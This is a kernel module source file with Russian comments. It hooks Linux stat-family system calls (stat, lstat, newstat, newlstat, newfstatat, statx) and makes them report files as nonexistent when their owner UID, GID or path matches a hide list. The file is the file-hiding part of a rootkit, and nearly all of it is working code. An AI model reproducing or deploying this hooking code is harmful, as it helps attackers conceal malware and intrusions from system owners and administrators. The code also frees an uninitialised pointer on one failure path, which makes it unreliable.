/*
    скрывает по uid gid и подстроке
    не скрывает по pid (это что?)
*/

/*
    Находятся в resources/hide_files_functions.c
    
    bool copy_filepath(char *filepath, char **kfilepath);
    bool is_hide_uid(unsigned int file_uid);
    bool is_hide_gid(unsigned int file_gid);
    bool is_hide_file(unsigned int file_uid, unsigned int file_gid, char *kfilepath);

    unsigned int uids[];
    unsigned int gids[];
    struct Extended_array ea_uids;
    struct Extended_array ea_gids;
*/

bool copy_file_stat(struct stat *statbuf, struct stat **kstatbuf);
bool copy_file_statx(struct statx *statxbuf, struct statx **kstatxbuf);
void free_bufs(void *first, void *second);

/*
    copy_file_stat - функция, копирует stat файла в пространство ядра

    struct stat *statbuf   - указатель на пространство пользователя
    struct stat **kstatbuf - указатель на указатель на пространство ядра
*/
bool copy_file_stat(struct stat *statbuf, struct stat **kstatbuf) {
    *kstatbuf = kzalloc(sizeof(struct stat), GFP_KERNEL);
    if (*kstatbuf == NULL) {
        return false;
    }

    if (copy_from_user(*kstatbuf, statbuf, sizeof(struct stat))) {
        return false;
    }

    return true;
}

/*
    copy_file_stat - функция, копирует statx файла в пространство ядра

    struct statx *statxbuf   - указатель на пространство пользователя
    struct statx **kstatxbuf - указатель на указатель на пространство ядра
*/
bool copy_file_statx(struct statx *statxbuf, struct statx **kstatxbuf) {
    *kstatxbuf = kzalloc(sizeof(struct statx), GFP_KERNEL);
    if (*kstatxbuf == NULL) {
        return false;
    }

    if (copy_from_user(*kstatxbuf, statxbuf, sizeof(struct statx))) {
        return false;
    }

    return true;
}

/*
    free_bufs - функция, освобождать выделенную память

    void *first  - указатель на память
    void *second - указатель на память
*/
void free_bufs(void *first, void *second) {
    if (first) {
        kfree(first);
    }

    if (second) {
        kfree(second);
    }   
}

// ===================== Перехват функций ===============================

/*
    asmlinkage long sys_stat(
        const char __user *filename,                - di
        struct __old_kernel_stat __user *statbuf    - si
        );

*/
static asmlinkage long ex_sys_stat(struct pt_regs *regs)
{
    long ret = real_sys_stat(regs);

    if (ret < 0) {
        return ret;
    }

    char *kfilepath;
    struct stat *kstatbuf;

    if (!copy_file_stat((struct stat *)regs->si, &kstatbuf) ||
        !copy_filepath((char *)regs->di, &kfilepath) ||
        !is_hide_file(kstatbuf->st_uid, kstatbuf->st_gid, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    free_bufs(kstatbuf, kfilepath);
    return ret;
}

/*
    asmlinkage long sys_lstat(
        const char __user *filename,                - di
        struct __old_kernel_stat __user *statbuf    - si
        );
*/
static asmlinkage long ex_sys_lstat(struct pt_regs *regs)
{
    long ret = real_sys_lstat(regs);

    if (ret < 0) {
        return ret;
    }

    char *kfilepath;
    struct stat *kstatbuf;

    if (!copy_file_stat((struct stat *)regs->si, &kstatbuf) ||
        !copy_filepath((char *)regs->di, &kfilepath) ||
        !is_hide_file(kstatbuf->st_uid, kstatbuf->st_gid, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    free_bufs(kstatbuf, kfilepath);
    return ret;
}

/*
    asmlinkage long sys_newstat(
        const char __user *filename,    - di
        struct stat __user *statbuf);   - si
*/
static asmlinkage long ex_sys_newstat(struct pt_regs *regs)
{
    long ret = real_sys_newstat(regs);
    
    if (ret < 0) {
        return ret;
    }
    
    char *kfilepath;
    struct stat *kstatbuf;

    if (!copy_file_stat((struct stat *)regs->si, &kstatbuf) ||
        !copy_filepath((char *)regs->di, &kfilepath) ||
        !is_hide_file(kstatbuf->st_uid, kstatbuf->st_gid, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    free_bufs(kstatbuf, kfilepath);
    return ret;
}

/*
    asmlinkage long sys_newlstat(
        const char __user *filename,    - di
        struct stat __user *statbuf     - si
        );
*/
static asmlinkage long ex_sys_newlstat(struct pt_regs *regs)
{
    long ret = real_sys_newlstat(regs);
    
    if (ret < 0) {
        return ret;
    }
    
    char *kfilepath;
    struct stat *kstatbuf;

    if (!copy_file_stat((struct stat *)regs->si, &kstatbuf) ||
        !copy_filepath((char *)regs->di, &kfilepath) ||
        !is_hide_file(kstatbuf->st_uid, kstatbuf->st_gid, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    free_bufs(kstatbuf, kfilepath);
    return ret;
}

/*
    asmlinkage long sys_newfstatat(
        int dfd,                        - di
        const char __user *filename,    - si
		struct stat __user *statbuf,    - dx
        int flag);                      - r10
*/
static asmlinkage long ex_sys_newfstatat(struct pt_regs *regs)
{
    long ret = real_sys_newfstatat(regs);

    if (ret < 0) {
        return ret;
    }

    char *kfilepath;
    struct stat *kstatbuf;

    if (!copy_file_stat((struct stat *)regs->dx, &kstatbuf) ||
        !copy_filepath((char *)regs->si, &kfilepath) ||
        !is_hide_file(kstatbuf->st_uid, kstatbuf->st_gid, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    free_bufs(kstatbuf, kfilepath);
    return ret;
}

/*
    asmlinkage long sys_statx(
        int dfd,                            - di
        const char __user *path,            - si
        unsigned flags,                     - dx
        unsigned mask,                      - r10
        struct statx __user *buffer         - r8
        );
*/
static asmlinkage long ex_sys_statx(struct pt_regs *regs)
{
    long ret = real_sys_statx(regs);

    if (ret < 0) {
        return ret;
    }

    char *kfilepath;
    struct statx *kstatxbuf;

    if (!copy_file_statx((struct statx *)regs->r8, &kstatxbuf) ||
        !copy_filepath((char *)regs->si, &kfilepath) ||
        !is_hide_file(kstatxbuf->stx_uid, kstatxbuf->stx_gid, kfilepath)) {
        goto out;
    }

    ret = -ENOENT;

out:
    free_bufs(kstatxbuf, kfilepath);
    return ret;
}

// ======================================================================
